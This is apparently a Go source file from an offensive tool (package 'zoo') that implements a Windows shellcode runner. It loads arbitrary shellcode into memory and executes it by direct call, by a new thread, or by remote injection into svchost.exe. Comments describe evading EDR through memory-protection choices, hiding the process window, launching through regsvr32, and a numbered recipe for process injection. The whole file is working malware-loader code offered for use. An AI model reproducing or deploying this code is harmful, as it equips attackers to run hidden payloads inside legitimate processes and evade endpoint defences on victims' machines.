//go:build windows
// +build windows

package zoo

import (
  "fmt"
  "errors"
  "unsafe"
  "syscall"
  "os/exec"
  "golang.org/x/sys/windows"
  ps"github.com/mitchellh/go-ps"
)

import "C"
//Stollen from https://github.com/yoda66/GoShellcode/blob/main/gosc.go
func CommandExecuter(cmd *exec.Cmd){//if it fails to build use exec.Command
  cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
}


func (scr *ShellCodeRunner) RunShellCode()error{
  switch scr.Method {
    case 1:
      err := scr.DirectSyscall()
      if err != nil { return err }
    case 2:
      err := scr.CreateThread()
      if err != nil { return err }
    case 3:
      err := scr.InjectProcess()
      if err != nil { return err }
    default:
      return errors.New("Unknown method")
  }
  return nil
}

// doing a direct syscall
func (scr *ShellCodeRunner) DirectSyscall()error{
  kernel32 := windows.NewLazyDLL("kernel32.dll")
  RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
  addr,err := windows.VirtualAlloc(uintptr(0),uintptr(len(scr.SC)),windows.MEM_COMMIT|windows.MEM_RESERVE,windows.PAGE_READWRITE)
  if err != nil{
    return errors.New(fmt.Sprintf("[!] VirtualAlloc(): %s",err.Error()))
  }
  RtlMoveMemory.Call(addr,(uintptr)(unsafe.Pointer(&scr.SC[0])),uintptr(len(scr.SC)))
  var oldProtect uint32
  //PAGE_EXECUTE_READ avoids EDR's (hopefully) unlike PAGE_EXECUTE_READWRITE
  // But for encodedpayloads you will need PAGE_EXECUTE_READWRITE cos we need to decode the payload before writing it to memory
  err = windows.VirtualProtect(addr,uintptr(len(scr.SC)), windows.PAGE_EXECUTE_READ,&oldProtect)
  if err != nil {
    return errors.New(fmt.Sprintf("[!] VirtualProtect(): %s",err.Error()))
  }
  syscall.Syscall(addr,0,0,0,0)
  return nil
}

// create thread in the same process
func (scr *ShellCodeRunner) CreateThread()error{
  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
  CreateThread := kernel32.NewProc("CreateThread")
  addr,err := windows.VirtualAlloc(uintptr(0),uintptr(len(scr.SC)),windows.MEM_COMMIT|windows.MEM_RESERVE,windows.PAGE_READWRITE)
  if err != nil{
    return errors.New(fmt.Sprintf("[!] VirtualAlloc(): %s",err.Error()))
  }
  RtlMoveMemory.Call(addr,(uintptr)(unsafe.Pointer(&scr.SC[0])),uintptr(len(scr.SC)))
  var oldProtect uint32
  //PAGE_EXECUTE_READ avoids EDR's (hopefully) unlike PAGE_EXECUTE_READWRITE
  // But for encodedpayloads you will need PAGE_EXECUTE_READWRITE cos we need to decode the payload before writing it to memory
  err = windows.VirtualProtect(addr,uintptr(len(scr.SC)), windows.PAGE_EXECUTE_READ,&oldProtect)
  if err != nil {
    return errors.New(fmt.Sprintf("[!] VirtualProtect(): %s",err.Error()))
  }
  thread,_, err := CreateThread.Call(0,0,addr,uintptr(0),0,0)
  if err.Error() != "The operation completed successfully."{
    return errors.New(fmt.Sprintf("[!]CreateThread(): %s",err.Error()))
  }
  _,_ = windows.WaitForSingleObject(windows.Handle(thread),0xFFFFFFF)
  return nil
}

/*
  with regsvr32.exe /i minion.dll
*/


// PROCESS INJECTION
/*
  1. Finad a suitable process that you  have a security token to access
  2. Open a process handle with OpenProcess()
  3. Allocate memory in remote process with VirtualAllocEx()
  4. Write Shellcode into process memory with WriteProcessMemory
  5. OPTIONAL: tighten up memory protections with VirtualProtectEx()
  6. Create remote thread with CreateRemoteThreadEx()
*/

func findProcess(proc string) int{
  processList,err := ps.Processes()
  if err != nil { return -1 }
  for _,x := range processList {
    var process ps.Process
    process = x
    if process.Executable() != proc{
      continue
    }
    p,errOpenProcess := windows.OpenProcess(windows.PROCESS_VM_OPERATION,false,uint32(process.Pid()))
    if errOpenProcess != nil{
      continue
    }
    windows.CloseHandle(p)
    return process.Pid()
  }
  return 0
}

func (scr *ShellCodeRunner) InjectProcess()error{
  pid  := findProcess("svchost.exe")
  fmt.Printf("[+]  Injecting into svchost.exe, PID=[%d]\n",pid)
  if pid == 0{
    return errors.New("Can  not find svchost.exe")
  }
  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
  CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
  VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
  proc,errOpenProcess := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ,false,uint32(pid))
  if errOpenProcess != nil{
    return errors.New(fmt.Sprintf("[!] Error calling OpenProcess: \r\n%s",errOpenProcess.Error()))
  }
  addr,_,errVirtualAloc := VirtualAllocEx.Call(uintptr(proc),0,uintptr(len(scr.SC)),windows.MEM_COMMIT|windows.MEM_RESERVE,windows.PAGE_READWRITE)
  if errVirtualAloc != nil && errVirtualAloc.Error() !=  "The operation completed successfully." {
    return errors.New(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s",errVirtualAloc.Error()))
  }

  _,_, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(proc),addr,(uintptr)(unsafe.Pointer(&scr.SC[0])),uintptr(len(scr.SC)))
  if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
    return errors.New(fmt.Sprintf("[!]Error  calling WriteProcessMemory:\r\n%s",errWriteProcessMemory.Error()))
  }
  op := 0
  _,_,errVirtualProtectEx := VirtualProtectEx.Call(uintptr(proc),addr,uintptr(len(scr.SC)),windows.PAGE_EXECUTE_READ,uintptr(unsafe.Pointer(&op)))
  if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
    return errors.New(fmt.Sprintf("[!]Error calling VirtualProtectEx():\r\n%s",errVirtualProtectEx.Error()))
  }
  _,_,errCreateRemoteThreadEx := CreateRemoteThreadEx.Call(uintptr(proc),0,0,addr,0,0,0)
  if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx.Error() !=  "The operation completed successfully."{
    return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx:\r\n%s",errCreateRemoteThreadEx.Error()))
  }
  errCloseHandle := windows.CloseHandle(proc)
  if errCloseHandle != nil {
    return errors.New(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s",errCloseHandle.Error()))
  }
  return nil
}

// indirect syscall
func (scr *ShellCodeRunner) SelfInject()error{
  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  ntdll := windows.NewLazySystemDLL("ntdll.dll")
  VirtualAlloc := kernel32.NewProc("VirtualAlloc")
  VirtualProtect := kernel32.NewProc("VirtualProtect")
  RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")

  addr,_, errVirtualAloc := VirtualAlloc.Call(0,uintptr(len(scr.SC)),windows.MEM_COMMIT|windows.MEM_RESERVE,windows.PAGE_READWRITE)
  if errVirtualAloc != nil &&errVirtualAloc.Error() != "The operation completed successfully." {
    return fmt.Errorf("[!]Error calling VirtualAlloc:\r\n%s",errVirtualAloc.Error())
  }
  if addr == 0 {
    return errors.New("[!] VirtualAlloc failed and returned 0")
  }

  _,_,errRtlCopyMemory := RtlCopyMemory.Call(addr,(uintptr)(unsafe.Pointer(&scr.SC[0])),uintptr(len(scr.SC)))
  if errRtlCopyMemory != nil && errRtlCopyMemory.Error() != "The operation completed successfully." {
    return fmt.Errorf("[!]Error calling RtlCopyMemory:\r\n%s",errRtlCopyMemory.Error())
  }

  oldProtect := windows.PAGE_READWRITE
  _,_,errVirtualProtect := VirtualProtect.Call(addr,uintptr(len(scr.SC)),windows.PAGE_EXECUTE_READ,uintptr(unsafe.Pointer(&oldProtect)))
  if errVirtualProtect != nil && errVirtualProtect.Error() != "The operation completed successfully." {
    return fmt.Errorf("[!]Error calling  VirtualProtect:\r\n%s",errVirtualProtect.Error())
  }

  _,_,errSyscall := syscall.Syscall(addr,0,0,0,0)
  if errSyscall != 0 {
    return fmt.Errorf("[!]Error executing shellcode syscall:r\n%s",errSyscall.Error())
  }
  return nil
}
